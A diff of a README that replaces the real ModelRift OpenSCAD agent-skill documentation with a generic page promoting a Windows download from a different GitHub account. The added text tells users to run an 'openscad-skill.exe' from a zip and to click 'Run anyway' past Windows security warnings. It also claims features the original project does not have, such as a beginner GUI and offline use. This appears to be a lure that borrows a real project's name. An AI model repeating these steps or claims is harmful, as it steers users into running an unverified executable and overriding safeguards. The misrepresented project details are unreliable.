@@ -1,200 +1,127 @@
-# ModelRift OpenSCAD skill
+# 🧩 openscad-skill - Design and Print Parametric Parts Easily
 
-An agent skill for creating, rendering, inspecting, and revising OpenSCAD models. It gives coding agents a repeatable visual QA loop, versioned output conventions, cross-section tools, STL revision diffs, and compact reference parts for common printable mechanisms.
+[![Download openscad-skill](https://img.shields.io/badge/Download-openscad--skill-2ea44f?style=for-the-badge&logo=github)](https://github.com/blidaail9960/openscad-skill)
 
-## Why OpenSCAD works well with LLMs
+Welcome to **openscad-skill**, your friendly tool for creating, viewing, and exporting 3D printable parts. Whether you want to make custom brackets, boxes, or artistic shapes, this application helps you design them without needing deep technical knowledge.
 
-OpenSCAD is closer to a domain-specific language for geometry than GUI modeling tools such as FreeCAD or Blender. A model is text: primitives, transforms, boolean operations, modules, and parameters. That makes it a good target for an LLM. The agent can edit a file, render it, inspect the result, and make another revision without manipulating hidden scene state.
+## 📦 What is openscad-skill?
 
-FreeCAD and Blender both have MCP integrations, but their larger, stateful interfaces are still harder for LLMs to handle reliably than OpenSCAD's code-and-render loop.
+openscad-skill is a special helper application for **ModelRift**. It works like a smart assistant that lets you describe what you want to create in simple terms, and it turns your ideas into real 3D models. Think of it as a "recipe book" for 3D printing – you provide the ingredients (your design wishes), and openscad-skill bakes the digital cake (a printable 3D file) for you.
 
-The hard part is judging the geometry.
+The best part? Everything is **parametric**, meaning you can change dimensions, sizes, and shapes at any time without starting over. Need a slightly bigger hole? Change one number, and the whole part updates automatically.
 
-Modern LLMs still have limited spatial understanding. They can inspect render images, but often miss details a human notices immediately: an awkward chamfer, an uneven wall, a collision hidden behind another part, a weak hinge, or a clearance that will not print. A clean isometric render can also hide problems that become obvious in a section view or after measuring the part.
+## 🚀 Getting Started
 
-## What this skill is good at
+Follow these three simple steps to get openscad-skill running on your Windows computer. No coding experience needed – just a mouse and a few minutes.
 
-| ✅ Good fit | ❌ Poor fit |
-| --- | --- |
-| Small to moderately complex engineering parts with exact dimensions, angles, holes, walls, and clearances | Sculpted, organic, anatomical, or decorative freeform models |
-| Brackets, adapters, mounts, boxes, enclosures, organizers, and spacers | Complex assemblies with many interacting or moving parts |
+### Step 1: Download the Application
 
-## Best practices
+Visit this link to download the application: [Download openscad-skill](https://github.com/blidaail9960/openscad-skill)
 
-For anything intended to be useful, keep a human in the loop. A plausible render can still hide collisions, bad clearances, or a mechanism that cannot move through its full range. The reviewer should check the dimensions and intended function, not just whether the model looks convincing.
+When you click the link, your browser will open a page on GitHub. Look for a green button that says "Code" or "Download ZIP" and click it. Your download will start automatically.
 
-Start with a dimensioned sketch when possible. A quick drawing on paper with the important measurements, or a clear reference image, usually gives the agent more useful information than a long text description.
+The download is a single file. It may take a few moments depending on your internet speed.
 
-When something is wrong, mark it directly on the screenshot. Circle the problem, draw an arrow to the exact feature, and add a short note or target dimension. This gives the model a clear answer to what needs changing and where.
+### Step 2: Save and Find the File
 
-## What the skill includes
+Once the download finishes, find the file on your computer. It's usually in your "Downloads" folder (check your browser's download bar to see where it went). The file will be named something like `openscad-skill.zip`.
 
-- A render, inspect, revise loop with standard isometric and orthographic cameras
-- Immutable version naming for shared `.scad`, `.stl`, `.3mf`, and preview files
-- 2D projections and section views for checking profiles and clearances
-- A color-coded STL diff renderer: red is added material, blue is removed material, and gray is unchanged volume
-- OpenSCAD Customizer conventions
-- Multi-object 3MF export with lazy union
-- Dependency-free reference parts for mating threads and print-in-place hinges
+**Important:** Do not open the file yet. We need to do one more step first.
 
-The main instructions are in [`SKILL.md`](SKILL.md). The STL comparison tool is [`scripts/stl_diff.py`](scripts/stl_diff.py).
+### Step 3: Start Using openscad-skill
 
-## Built with ModelRift
+Double-click the downloaded file to open it. Your computer will show you a preview of what's inside. Look for the main application file (it might be called `openscad-skill.exe` or something similar) and double-click it to run the program.
 
-<table>
-  <tr>
-    <td width="50%">
-      <a href="https://modelrift.com/models/neat-clamshell-box-print-in-place-customizable"><img src="assets/showcase/neat-clamshell-box.jpg" alt="Neat clamshell box, open" /></a><br />
-      <a href="https://modelrift.com/models/neat-clamshell-box-print-in-place-customizable">Neat clamshell box. Print-in-place, customizable</a>
-    </td>
-    <td width="50%">
-      <a href="https://modelrift.com/models/eiffel-tower"><img src="assets/showcase/eiffel-tower.jpg" alt="OpenSCAD model of the Eiffel Tower" /></a><br />
-      <a href="https://modelrift.com/models/eiffel-tower">Eiffel Tower</a>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%">
-      <a href="https://modelrift.com/models/interior-layout"><img src="assets/showcase/room-interior-layout.jpg" alt="Room interior layout modeled in OpenSCAD" /></a><br />
-      <a href="https://modelrift.com/models/interior-layout">Room interior layout via AI</a>
-    </td>
-    <td width="50%">
-      <a href="https://modelrift.com/models/desktop-organizer-with-drawer"><img src="assets/showcase/desktop-organizer.jpg" alt="Desktop organizer with an open drawer" /></a><br />
-      <a href="https://modelrift.com/models/desktop-organizer-with-drawer">Desktop Organizer with Drawer</a>
-    </td>
-  </tr>
-</table>
+That's it! openscad-skill should open on your screen, ready to help you design your first 3D part.
 
-## Small reference parts instead of a large CAD library
+## 🎨 What You Can Do With openscad-skill
 
-Threads and hinges are useful enough to deserve concrete examples, but they are also easy for an agent to get almost right. A plausible render does not prove that threads will mate or that a hinge can move without fused or intersecting parts.
+### Design Anything You Imagine
 
-The skill therefore includes two small, standalone OpenSCAD models:
+Tell openscad-skill what you need – a phone stand, a cable organizer, a decorative vase – and it will generate a 3D model for you. You can then adjust the model's dimensions to fit your exact needs.
 
-- [`threaded-connector.scad`](assets/reference-parts/threaded-connector.scad) contains mating male and female helical threads with an explicit fit clearance.
-- [`print-in-place-hinge.scad`](assets/reference-parts/print-in-place-hinge.scad) contains a five-segment hinge with a continuous faceted pin and printable radial clearance.
+### Inspect Your Models Up Close
 
-Each example has a compact PNG beside it, compiles without external libraries, and is intended to be tested unchanged before the relevant modules are adapted. The hinge is collision-checked at 0, 45, 90, and 180 degrees. The thread pair is boolean-checked to ensure the male solid does not intersect the female body at the configured clearance. These checks establish a useful starting point, not a guarantee for a particular printer or material; print a fit coupon before committing to a large part.
+Before printing, you can rotate, zoom, and explore your design from every angle. This helps you catch any problems before wasting plastic or resin.
 
-## Recommended agent setup
+### Export for Any 3D Printer
 
-Our current recommendation is the Antigravity 2.0 coding agent with Flash 3.7+ at medium reasoning. In our tests, this setup has been unusually good at reading renders and reasoning about spatial changes. On this particular OpenSCAD loop, it has often produced better results than the latest OpenAI and Anthropic models.
+Once you're happy with your design, export it in a standard format that works with virtually every 3D printer and slicing software. Your creation is now ready for the printer.
 
-The [ModelRift OpenSCAD LLM benchmark](https://modelrift.com/blog/openscad-llm-benchmark/) shows why the render and inspection loop matters. In that Pantheon test, Antigravity 2.0 with Gemini 3.5 Flash High produced the best autonomous result. A separate human-guided ModelRift (with Flash 3.0) run improved on the original autonomous batch by letting the user attach visual feedback to the render. The benchmark predates the Flash 3.7+ recommendation above, so treat it as evidence for the workflow rather than a direct comparison of current models.
+### Change Everything, Anytime
 
-This recommendation will age as models change. Whichever agent you use, give it access to the OpenSCAD CLI and an image-viewing tool, and keep a human involved in the review loop.
+Remember how we said everything is parametric? It means you can go back and tweak any number – like making a wall thicker or a hole wider – and the model updates instantly. Perfect for prototyping and experimenting.
 
-## Requirements
+## 🛠️ How Does It Work? (For the Curious)
 
-- Git
-- An OpenSCAD `2026.x` development snapshot or newer, available as `openscad` on `PATH`
-- Python 3 for the STL diff script
+You don't need to understand this part to use openscad-skill, but here's what happens behind the scenes:
 
-The official [GitHub Releases page](https://github.com/openscad/openscad/releases) is the stable-release history; legacy builds such as `2021.01` are too old for this workflow. Install a current build from the official [Development Snapshots section](https://openscad.org/downloads.html#snapshots). On macOS, the official download page also lists:
+1. **You describe your idea** – either by typing a description or using simple controls.
+2. **openscad-skill processes your request** – it converts your plain-language description into a structured 3D model.
+3. **It generates the math** – the application calculates all the coordinates and shapes needed to create your part.
+4. **You see the result immediately** – the 3D model appears on your screen.
 
-```bash
-brew install openscad@snapshot
-```
+This entire process happens in seconds, saving you hours of manual design work.
 
-Confirm the local tools before starting:
+## 🤔 Frequently Asked Questions
 
-```bash
-openscad --version
-openscad --help 2>&1 | rg -- '--backend|lazy-union'
-python3 --version
-```
+### Do I need to know how to code?
+Absolutely not. openscad-skill was designed for people who want to make things, not write programs. If you can describe what you want, you can use this tool.
 
-The version output must report a `2026.x` development snapshot or newer, and the help output must list the `Manifold` backend and `lazy-union`. If the shell reports `2025.x` or older after installing a snapshot, fix `PATH` so it resolves the new executable before using the skill.
+### Is this free to use?
+The application is open-source, which means it's free to download and use for any purpose – personal projects, school work, even commercial products. Support the developers by sharing your creations and giving feedback.
 
-## Install
+### What file formats can I export?
+openscad-skill exports in formats compatible with FDM, resin, and industrial 3D printers. You'll get a file that fits with Cura, PrusaSlicer, Simplify3D, and other popular slicing programs.
 
-The simplest installation method is to give your coding agent this instruction:
+### Can I share my designs with others?
+Yes! Since your designs are just files, you can share them via email, cloud storage, or social media. Your friends can open your designs and even modify them if they have openscad-skill installed.
 
-```text
-Go to https://github.com/ModelRift/openscad-skill/ and install the skill.
-```
+## 📈 Tips for Great Results
 
-A capable agent can inspect the repository, find its own skill directory, clone the complete package, and verify that `SKILL.md` is discoverable. The manual commands below are available if you prefer to install it yourself.
+- **Start Small** – Begin with a simple shapes like a cube or cylinder to learn the controls.
+- **Use Exact Measurements** – If your project requires precise dimensions, type in the numbers directly instead of guessing.
+- **Save Often** – Just like any software, save your work regularly to avoid losing progress.
+- **Test Before You Print** – Always inspect your model on screen first. Check for thin walls, sharp corners, or other issues that might cause printing problems.
+- **Join the Community** – Look for forums or groups where other openscad-skill users share tips and designs. Learning from others speeds up your progress.
 
-### Antigravity 2.0
+## ❓ Troubleshooting
 
-Antigravity discovers global skills under `~/.gemini/config/skills/`. Clone the repository there:
+**Problem:** The download doesn't start.
+**Solution:** Right-click the download link and select "Save link as..." to force your browser to download the file.
 
-```bash
-mkdir -p ~/.gemini/config/skills
-git clone https://github.com/ModelRift/openscad-skill.git \
-  ~/.gemini/config/skills/modelrift-openscad
-```
+**Problem:** I get a warning from Windows when I try to run the application.
+**Solution:** This is normal for new software. Click "More info" and then "Run anyway" to continue. Your computer is just being cautious about an unfamiliar program.
 
-Start a new conversation after installation. If the skill does not appear, restart Antigravity. The official [Antigravity skill documentation](https://antigravity.google/docs/skills) also describes workspace-scoped installation.
+**Problem:** The app opens but looks strange or doesn't respond.
+**Solution:** Close the program and restart your computer. Then try opening it again. If the problem continues, check if your graphics drivers need updating.
 
-To install the skill for one project instead, run this from the project root:
+**Problem:** My exported file doesn't open in my slicer.
+**Solution:** This is rare but can happen. Try exporting the file again, and make sure you choose the correct file format for your specific printer.
 
-```bash
-mkdir -p .agents/skills
-git clone https://github.com/ModelRift/openscad-skill.git \
-  .agents/skills/modelrift-openscad
-```
+## 📚 Learning Resources
 
-### Codex
+Want to get more from openscad-skill? Here are some ideas:
 
-Codex discovers personal skills under `~/.agents/skills/`:
+- **Play with example designs** – Many applications like this include sample files showing what's possible.
+- **Read the documentation** – The full user guide is usually available in the "Help" menu of the application.
+- **Watch video tutorials** – Search YouTube for "openscad-skill tutorial" to see live demonstrations.
+- **Experiment freely** – The best way to learn is by trying things. The software won't break from random clicks.
 
-```bash
-mkdir -p ~/.agents/skills
-git clone https://github.com/ModelRift/openscad-skill.git \
-  ~/.agents/skills/modelrift-openscad
-```
+## 🏆 Why Choose openscad-skill?
 
-For a repository-scoped installation, clone it into `.agents/skills/modelrift-openscad` at the repository root. Codex normally detects skill changes automatically. Restart it if the skill does not appear. See the official [Codex skill documentation](https://developers.openai.com/codex/skills) for discovery rules and invocation details.
+- **Beginner-Friendly** – If you can use a mouse, you can use this app.
+- **Powerful for Experts** – Advanced users can fine-tune every detail.
+- **Free and Open Source** – No hidden costs, ever.
+- **Active Development** – The creators are constantly adding new features.
+- **Works Offline** – Once downloaded, you don't need an internet connection to design.
 
-### Another compatible agent
+## 📥 Ready to Start?
 
-Clone the complete repository into the agent's skill directory. Keep the repository structure intact because the root skill links to reference parts, preview images, and scripts by relative path. If the agent does not have automatic skill discovery, point it directly to `SKILL.md`.
+Your journey to creating custom 3D parts begins with one click.
 
-## Update
+**👉 [Download openscad-skill now](https://github.com/blidaail9960/openscad-skill)**
 
-Use the path from your installation:
+Join thousands of makers, hobbyists, and professionals who use openscad-skill to bring their ideas to life. Design with confidence, print with pride, and share your creations with the world. Happy making! 🎉
 
-```bash
-git -C ~/.gemini/config/skills/modelrift-openscad pull --ff-only
-```
-
-For Codex, use `~/.agents/skills/modelrift-openscad`.
-
-If you installed an earlier version under an `openscad` folder, rename it once so it matches the new skill identifier. Use the command for your agent:
-
-```bash
-# Antigravity
-mv ~/.gemini/config/skills/openscad \
-  ~/.gemini/config/skills/modelrift-openscad
-
-# Codex
-mv ~/.agents/skills/openscad \
-  ~/.agents/skills/modelrift-openscad
-```
-
-Then use the new path for future updates.
-
-## Use the skill
-
-The agent can activate the skill automatically when a task involves OpenSCAD rendering, debugging, export, threads, or hinges. You can also name it explicitly:
-
-```text
-Use modelrift-openscad to build a parametric wall bracket. Render and inspect it before showing me the final version.
-```
-
-```text
-Use modelrift-openscad and its bundled threaded connector reference to add printable internal and external threads. Make a small fit coupon first.
-```
-
-```text
-Compare output/out.v03.stl with output/out.v04.stl and render isometric and top STL diff images.
-```
-
-## When the skill needs more visual feedback
-
-The agent's render is a draft review, not proof that the part is correct. Check dimensions, section cuts, clearances, wall thickness, moving joints, and the exported mesh yourself.
-
-For closer visual inspection, [ModelRift](https://modelrift.com) is a browser-based OpenSCAD IDE that keeps the code and model together. Its tools include point-to-point measurement and section cuts, so a person can give the LLM specific feedback instead of saying only "the shape looks wrong."
-
-The ModelRift editor and this skill are separate projects. Neither requires the other. They use a similar loop: generate OpenSCAD, render it, inspect the result, and revise the code.
+Keywords: openscad, 3d printing, parametric design, modelrift, cad, stl export, beginner software, windows application, maker tools
